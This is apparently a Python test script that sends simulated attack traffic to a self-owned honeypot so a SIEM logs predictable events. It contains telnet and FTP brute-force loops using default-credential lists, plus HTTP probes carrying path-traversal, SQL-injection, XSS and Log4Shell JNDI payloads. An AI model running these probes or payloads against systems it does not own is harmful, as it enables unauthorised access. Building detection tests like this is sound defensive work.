#!/usr/bin/env python3
"""
Generate test traffic against a running honey-bit instance so the SIEM
receives a predictable set of events (connection, login_attempt,
http_request with indicators, ssh_banner, ...).

Only use this against a honeypot you own. It connects to the ports you
give it and sends harmless, canned strings.

Usage:
    python3 simulate_attacks.py                       # target 127.0.0.1, default ports
    python3 simulate_attacks.py --host 10.0.0.9 --ssh 2222 --http 8080 --telnet 2323 --ftp 2121
    python3 simulate_attacks.py --scenario bruteforce --count 25
"""

from __future__ import annotations

import argparse
import random
import socket
import sys
import time

USERNAMES = ["root", "admin", "ubuntu", "pi", "test", "oracle", "postgres", "user"]
PASSWORDS = ["123456", "password", "admin", "root", "toor", "raspberry", "P@ssw0rd", "letmein"]
USER_AGENTS = [
    "Mozilla/5.0 (compatible; siem-test-scanner/1.0)",
    "python-requests/2.31.0",
    "curl/8.5.0",
    "masscan/1.3",
]
PROBE_PATHS = [
    "/", "/robots.txt", "/.env", "/wp-login.php", "/admin", "/login",
    "/phpmyadmin/index.php", "/cgi-bin/test.cgi", "/../../etc/passwd",
    "/index.php?id=1' OR '1'='1", "/actuator/health", "/.git/config",
    "/search?q=<script>alert(1)</script>", "/api?x=${jndi:ldap://test.invalid/a}",
]


def connect(host: str, port: int, timeout: float = 5.0) -> socket.socket | None:
    try:
        return socket.create_connection((host, port), timeout=timeout)
    except OSError as exc:
        print(f"  ! could not connect to {host}:{port}: {exc}", file=sys.stderr)
        return None


def read(sock: socket.socket, n: int = 1024) -> bytes:
    try:
        return sock.recv(n)
    except OSError:
        return b""


def ssh_probe(host: str, port: int) -> None:
    s = connect(host, port)
    if not s:
        return
    read(s)
    s.sendall(b"SSH-2.0-libssh2_1.11.0\r\n")
    s.sendall(bytes([0, 0, 0, 44, 10, 20]) + bytes(random.getrandbits(8) for _ in range(38)))
    time.sleep(0.2)
    s.close()
    print(f"  ssh    {host}:{port} banner + fake KEXINIT")


def telnet_bruteforce(host: str, port: int, tries: int) -> None:
    for _ in range(tries):
        s = connect(host, port)
        if not s:
            return
        read(s)
        u, p = random.choice(USERNAMES), random.choice(PASSWORDS)
        s.sendall(f"{u}\r\n".encode())
        read(s)
        s.sendall(f"{p}\r\n".encode())
        read(s)
        s.close()
        print(f"  telnet {host}:{port} login {u}:{p}")


def ftp_bruteforce(host: str, port: int, tries: int) -> None:
    for _ in range(tries):
        s = connect(host, port)
        if not s:
            return
        read(s)
        u, p = random.choice(USERNAMES), random.choice(PASSWORDS)
        s.sendall(f"USER {u}\r\n".encode())
        read(s)
        s.sendall(f"PASS {p}\r\n".encode())
        read(s)
        s.sendall(b"QUIT\r\n")
        s.close()
        print(f"  ftp    {host}:{port} login {u}:{p}")


def http_scan(host: str, port: int, count: int) -> None:
    paths = PROBE_PATHS if count >= len(PROBE_PATHS) else random.sample(PROBE_PATHS, count)
    for path in paths:
        s = connect(host, port)
        if not s:
            return
        method = "POST" if path.startswith(("/login", "/wp-login")) else "GET"
        body = "user=admin&pass=admin" if method == "POST" else ""
        req = (
            f"{method} {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
            "Accept: */*\r\n"
            + (f"Content-Type: application/x-www-form-urlencoded\r\nContent-Length: {len(body)}\r\n" if body else "")
            + "Connection: close\r\n\r\n" + body
        )
        s.sendall(req.encode())
        read(s, 4096)
        s.close()
        print(f"  http   {host}:{port} {method} {path}")


def main(argv=None) -> int:
    p = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    p.add_argument("--host", default="127.0.0.1")
    p.add_argument("--ssh", type=int, default=2222)
    p.add_argument("--http", type=int, default=8080)
    p.add_argument("--telnet", type=int, default=2323)
    p.add_argument("--ftp", type=int, default=2121)
    p.add_argument("--scenario", choices=("all", "recon", "bruteforce", "webscan"), default="all")
    p.add_argument("--count", type=int, default=5, help="attempts per service for bruteforce / paths for webscan")
    p.add_argument("--seed", type=int, help="random seed for reproducible runs")
    args = p.parse_args(argv)
    if args.seed is not None:
        random.seed(args.seed)

    print(f"honey-bit attack simulation -> {args.host} [{args.scenario}]")
    if args.scenario in ("all", "recon"):
        ssh_probe(args.host, args.ssh)
        http_scan(args.host, args.http, 2)
    if args.scenario in ("all", "bruteforce"):
        telnet_bruteforce(args.host, args.telnet, args.count)
        ftp_bruteforce(args.host, args.ftp, args.count)
    if args.scenario in ("all", "webscan"):
        http_scan(args.host, args.http, max(args.count, len(PROBE_PATHS)) if args.scenario == "webscan" else args.count)
    print("done")
    return 0


if __name__ == "__main__":
    sys.exit(main())
